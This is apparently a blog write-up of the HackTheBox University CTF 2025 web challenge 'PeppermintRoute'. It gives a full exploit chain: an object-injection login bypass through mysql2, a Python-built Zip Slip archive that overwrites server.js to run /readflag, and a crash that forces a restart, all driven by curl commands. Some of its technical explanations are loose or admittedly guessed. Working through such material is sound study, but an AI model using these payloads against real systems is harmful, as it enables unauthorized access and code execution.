---
title: "PeppermintRoute: My Journey Through Web Exploitation"
date: 2025-12-21
tags: ["HackTheBox", "CTF", "Web", "Node.js", "RCE", "File Upload", "ZIP Parser"]
categories: ["HackTheBox", "CTF"]
description: "Complete writeup of the PeppermintRoute challenge from HackTheBox University CTF 2025 - elegant web exploitation with multiple vulnerabilities"
featuredImage: "logo.png"
images: ["logo.png", "rank.png"]
---

# PeppermintRoute: My Journey Through Web Exploitation

Hey there! 👋 Let me walk you through our complete journey solving the PeppermintRoute challenge. This was part of the **HackTheBox University CTF 2025**, an international cybersecurity competition for students where we participated with the **Phreaks 2600** team.

![HTB University CTF 2025 Logo](./logo.png)

We finished **35th place** overall - not the best ranking, but hey, we had an amazing time! I was lucky enough to be **MVP of the team** (lol).

![Team Ranking](./rank.png)

This medium-difficulty web challenge was really cool for combining multiple vulnerabilities in creative ways. A huge shoutout to **Tibo.wav** who absolutely **clutched** with the final piece - the controlled crash technique that allowed us to restart the server and get our last flag of the CTF! 🎉

## First Impressions

**Challenge Description**: PeppermintRoute, Tinselwick's sleigh-navigation portal, has started showing unexplained disruptions ever since the Starshard Bauble disappeared—route files shift, some appear incomplete, and others no longer match what the elves prepared. With the Festival of Everlight approaching, the village needs someone to dig into the portal, uncover what's been altered, and recover the correct navigation data before preparations fall behind.

When we first saw PeppermintRoute, we thought: "Okay, a Node.js web app for managing holiday package deliveries. Looks like a typical web challenge with some authentication and file upload functionality." Little did we know this would turn into one of the most elegant exploit chains we've done.

**Quick Facts**:
- **Platform**: HackTheBox (their web challenges are always well-designed)
- **Difficulty**: Medium (turned out to be Medium-Hard with the twist)
- **Tech Stack**: Node.js/Express + MySQL + custom ZIP parser
- **Goal**: Get the HTB{flag} through remote code execution

The app manages holiday deliveries with different user roles (admins, pilots, users) and lets you upload ZIP files for packages. Sounds innocent enough, right?

## Getting My Bearings: Understanding the Target

Before diving into exploitation, we always like to understand what we're dealing with. Let me show you how we approached the reconnaissance phase.

### Architecture Discovery

We started by exploring the application structure. The app follows a pretty standard Node.js/Express pattern:

```
PeppermintRoute/
├── server.js              # Main server - this would be key for RCE
├── app/
│   ├── controllers/
│   │   ├── authController.js    # 🔴 This looked suspicious from the start
│   │   └── fileController.js    # File uploads - always check these
│   ├── utils/
│   │   └── zipParser.js         # 🔴 "Custom ZIP parser"? That's a red flag!
│   ├── routes/                  # Route definitions
│   ├── views/                   # EJS templates
│   └── public/                  # Static files
├── data/uploads/                # Where uploaded files go
└── init-db.js                   # Database setup
```

**Our Thought Process**: "Custom ZIP parser? In a file upload application? That's almost always vulnerable to Zip Slip attacks."

### Critical Assets Identification

We knew we needed to find where the flag was stored. In HTB challenges, there are usually a few common patterns:

1. **Database**: Sometimes flags are stored in the DB
2. **File system**: Often there's a `/readflag` binary
3. **Environment variables**: Sometimes exposed through debug endpoints

**What I Found**:
- **Flag Binary**: `/readflag` (setuid root - this is common in HTB)
- **Ports**: 80 (nginx) → 3000 (Node.js internal)
- **Database**: MySQL with role-based access (admin, pilot, user)

**Why This Matters**: The setuid binary means any user can execute it to read the flag, but I need code execution on the server to call it.

## Finding the First Vulnerability

We always start with the low-hanging fruit in web challenges: authentication. Let me walk you through how we discovered and exploited the auth bypass.

### Starting with the Login Endpoint

The first thing I tried was the obvious: basic SQL injection in the login form. But nothing worked. Then We looked at the source code (we had access to it locally for testing).

**What I Found in `authController.js`**:
```javascript
const login = async (req, res) => {
    const { username, password } = req.body;  // This destructuring caught my eye

    if (!username || !password) {
        return res.status(400).json({ error: 'Please enter Username and Password!' });
    }

    // MySQL query with prepared statements
    const [rows] = await connection.execute(
        'SELECT * FROM users WHERE username = ? AND password = ?',
        [username, password]
    );
};
```

**My Initial Thoughts**: "Prepared statements should prevent SQLi... but what's this destructuring doing? And why no type validation?"

### The Object Injection Discovery

I remembered a technique I read about in some security research. What if instead of strings, I send **objects** as the username and password?

**My Experiment**:
```json
{
    "username": {"username": 1},
    "password": {"password": 1}
}
```

**What Happens in JavaScript**:
```javascript
const { username, password } = req.body;
// username = {username: 1}  ← This is an OBJECT, not a string!
// password = {password: 1}  ← Same here

if (!username || !password)  // Objects are truthy, so this passes!
```

**The SQL Magic**: MySQL's `mysql2` library serializes objects into SQL:
- `{username: 1}` becomes `` `username` = 1 ``
- The WHERE clause becomes: `WHERE `username` = 1 AND `password` = 1`
- Since we're looking for ANY user, this becomes a tautology!

**Why This Works**: The prepared statement protects against direct SQL injection, but doesn't validate input types. Objects get serialized in unexpected ways.

**Our Reaction**: "Holy crap, that actually worked!"

**Resources I Referenced**:
- [Finding an unseen SQL Injection by bypassing escape functions in mysqljs/mysql](https://flatt.tech/research/posts/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql/)
- MySQL2 library documentation on object serialization

### The File Upload Vulnerability: Zip Slip

Now that I had admin access, I needed to find a way to execute code. File uploads are always suspicious, and this app had a custom ZIP parser. That screamed "Zip Slip vulnerability" to me.

**My Investigation Process**:
1. I looked at the file upload endpoint - it accepted ZIP files
2. Found the custom parser in `app/utils/zipParser.js`
3. Analyzed the extraction logic

**What I Found**:
```javascript
extractAll(destDir) {
    for (const entry of entries) {
        const zipName = entry.fileName.replace(/\\/g, '/');

        // Only checks how many directories deep
        const parts = zipName.split('/').filter(p => p);
        if (parts.length > 4) continue;  // This is WEAK protection!

        // VULNERABILITY: No path traversal check!
        const fullPath = path.resolve(destDir, zipName);
        fs.writeFileSync(fullPath, content);  // Writes ANYWHERE!
    }
}
```

**How Zip Slip Works**:
In ZIP files, you can specify paths like `../../../server.js`. The `path.resolve()` function in Node.js normalizes these paths:

```javascript
const destDir = "/app/data/uploads/recipient_123/";
const zipName = "../../../server.js";
const fullPath = path.resolve(destDir, zipName);
// Result: "/app/server.js" ← OUTSIDE the upload directory!
```

**Why the Protection Failed**:
The code only counted directory depth (`parts.length > 4`) but didn't check for `..` sequences. A path like `../../../server.js` has only 1 part after filtering, so it passes the check!

**My "Eureka!" Moment**: "I can overwrite the main server.js file! If I replace it with malicious code, I get RCE!"

**Creating the Exploit ZIP**:
```python
import zipfile

# Malicious server code that exposes /flag endpoint
payload = '''
const express = require('express');
const { execSync } = require('child_process');
const app = express();

app.get('/flag', (req, res) => {
  const flag = execSync('/readflag').toString();
  res.send(flag);
});

app.listen(3000);
'''

with zipfile.ZipFile("exploit.zip", "w") as z:
    z.writestr("../../../server.js", payload)  # Zip Slip attack!
```

**Resources That Helped Me**:
- [Zip Slip Vulnerability - Snyk](https://security.snyk.io/research/zip-slip-vulnerability)
- [GPUkiller/ZipSlipNodeJS on GitHub](https://github.com/GPUkiller/ZipSlipNodeJS)
- My own past experiences with similar vulnerabilities


## Putting It All Together: The Complete Exploit Chain

Now came the fun part: combining these vulnerabilities. But I ran into a problem - Node.js caches modules, so even after overwriting `server.js`, the running server wouldn't reload it.

**My Initial Failed Attempts**:
1. Just overwrite `server.js` and hope for reload → Didn't work (caching)
2. Try to crash the server with various payloads → Nothing worked
3. Look for admin restart buttons → None found

**The Breakthrough**: I needed a way to force a clean server restart. That's when I discovered the "controlled crash" technique.

### Step-by-Step Exploitation

#### Step 1: Get Admin Access (Auth Bypass)
```bash
# This was the easy part now that I understood the vulnerability
curl -X POST http://target.htb/login \
  -H "Content-Type: application/json" \
  -c admin_cookies.txt \
  -d '{"username":{"username":1},"password":{"password":1}}'
```
**Why this works**: Object injection in MySQL prepared statements. The objects get serialized as SQL fragments that always evaluate to true.

#### Step 2: Get a Pilot User (Need User-Level Access)
```bash
# I need a "user" role to access certain endpoints
PILOT=$(curl -s -b admin_cookies.txt "http://target.htb/api/admin/pilots-data" \
  | jq -r '.pilots[0].username')
```
**Why this step?**: The crash needs to be triggered from a user account, not admin.

#### Step 3: Login as Pilot
```bash
# Same auth bypass but for the pilot user
curl -X POST http://target.htb/login \
  -H "Content-Type: application/json" \
  -c user_cookies.txt \
  -d "{\"username\":\"$PILOT\",\"password\":{\"password\":1}}"
```

#### Step 4: Setup Recipient Access
```bash
RECIPIENT="clarion"
# Make sure the pilot has access to this recipient
curl -b admin_cookies.txt -X POST "http://target.htb/admin/recipients/$RECIPIENT/assign" \
  -d "username=$PILOT"
```

#### Step 5: Create the Dual-Purpose ZIP

This was the clever part - one ZIP file that does two things:

```python
import zipfile

# Payload 1: Replace server.js with flag-serving version
server_code = '''
const express = require('express');
const { execSync } = require('child_process');
const app = express();

app.get('/flag', (req, res) => {
  const flag = execSync('/readflag').toString();
  res.send(flag);
});

app.listen(3000);
'''

# Payload 2: Directory entry that will cause a crash
with zipfile.ZipFile("exploit.zip", "w") as z:
    z.writestr("../../../server.js", server_code)  # Zip Slip to overwrite server
    z.writestr("crash/", b"")                      # Empty directory entry
```

**Why the directory entry?** I discovered that when users try to download files, the server uses `fs.createReadStream()`. If the "file" is actually a directory, it causes an unhandled error that crashes Node.js.

#### Step 6: Upload the Malicious ZIP
```bash
curl -b admin_cookies.txt -X POST "http://target.htb/admin/recipients/$RECIPIENT/upload" \
  -F "files=@exploit.zip"
```

#### Step 7: Find the Crash File ID
```bash
CRASH_ID=$(curl -s -b user_cookies.txt "http://target.htb/api/user/package/$RECIPIENT" \
  | jq -r '.files[] | select(.filename=="crash") | .file_id')
```

#### Step 8: Trigger the Controlled Crash
```bash
# This attempts to download a "file" that's actually a directory
# fs.createReadStream() fails, throwing an unhandled exception
# Node.js crashes, supervisord restarts it with our new server.js
curl -b user_cookies.txt "http://target.htb/user/packages/$RECIPIENT/download?fileId=$CRASH_ID"
```

**Huge thanks to Tibo.wav** who discovered this brilliant controlled crash technique that made the entire exploit work! 🎉

#### Step 9: Profit - Get the Flag
```bash
# Server restarts with our malicious code
curl http://target.htb/flag
# Returns: HTB{flag}
```

### Why This Chain Works So Well

1. **Auth Bypass**: Gets us admin access without credentials
2. **Zip Slip**: Allows arbitrary file overwrite
3. **Controlled Crash**: Forces clean server restart (bypasses module caching)
4. **User Role Needed**: The crash must be triggered by a user, not admin

The beauty of this approach is that it uses the application's own error handling (or lack thereof) against itself!

## The Technical Deep Dive: Understanding Why Everything Works

Now let me explain the technical details that make this exploit possible. The controlled crash technique that Tibo.wav discovered was particularly clever.

### The Node.js Module Caching Problem

**Why just overwriting server.js doesn't work**:
Node.js caches required modules. When you do `require('./server.js')`, it loads the file once and keeps it in memory. Even if you change the file on disk, the running server still uses the cached version.

**My attempts to bypass this**:
1. Overwrite `server.js` → Cached version still runs
2. Try `require.cache` manipulation → Didn't work
3. Look for hot-reload mechanisms → None found

**The solution**: Force a complete process restart so modules get reloaded.

### The Controlled Crash Mechanism

We discovered this by accident while testing file downloads. Here's what happens:

**In the file download code (I assume this is what it looks like)**:
```javascript
app.get('/download', (req, res) => {
  const filePath = getFilePath(req.query.fileId);
  const stream = fs.createReadStream(filePath);  // This line is key!

  stream.on('error', (err) => {
    // ERROR HANDLING EXISTS HERE... but maybe not for this specific error?
    res.status(500).send('Error');
  });

  stream.pipe(res);
});
```

**What happens with a directory**:
- `filePath` points to a directory (like `/app/data/uploads/crash/`)
- `fs.createReadStream()` on a directory throws an exception
- If this exception isn't caught properly, it bubbles up and crashes the Node.js process

**Supervisor to the rescue**:
```ini
# From supervisord.conf
[program:nodejs]
command=/usr/local/bin/node /app/server.js
autorestart=true  # This is the key!
```

When Node.js crashes, supervisord automatically restarts it, loading the new `server.js` from disk.

**Why this is brilliant**:
1. It's a "clean" restart (not a forceful kill)
2. It bypasses module caching completely
3. It uses the application's own infrastructure against itself
4. No external intervention needed

### Authentication Bypass Details

**MySQL Parameter Serialization**:
```javascript
// Input: { username: {username: 1}, password: {password: 1} }
// MySQL sees: ['object', 'object']
// SQL becomes: WHERE username = `username` = 1 AND password = `password` = 1
// Result: Always true condition
```

**Session Hijacking**:
```javascript
// Successful login creates session
req.session.user = user;  // Admin user object stored
// All subsequent requests have admin privileges
```

### Zip Slip Technical Details

**Path Resolution Mechanics**:
```javascript
// Vulnerable pattern
const fullPath = path.resolve(destDir, zipName);

// Examples:
path.resolve("/app/data/uploads/123", "../../../server.js")
// → "/app/server.js" (traversal successful)

path.resolve("/app/data/uploads/123", "../../../../etc/passwd")
// → "/etc/passwd" (would work if permissions allowed)
```

**Depth-Limited Protection**:
```javascript
const parts = zipName.split('/').filter(p => p);
if (parts.length > 4) continue;  // Only blocks deep paths, not traversal
```

## Final Thoughts

If you're reading this and trying to solve PeppermintRoute, here's my advice:

1. **Don't give up on "impossible" paths** - the crash method seemed crazy at first
2. **Understand the technology stack** - Node.js caching was the key insight
3. **Try unconventional approaches** - object injection isn't obvious
4. **Combine vulnerabilities creatively** - auth + file upload + crash = win

Security research is as much about creativity and persistence as it is about technical knowledge.

**Happy Hacking!** 🎄🔒

---

*See You soon for another writeup - Elliot*
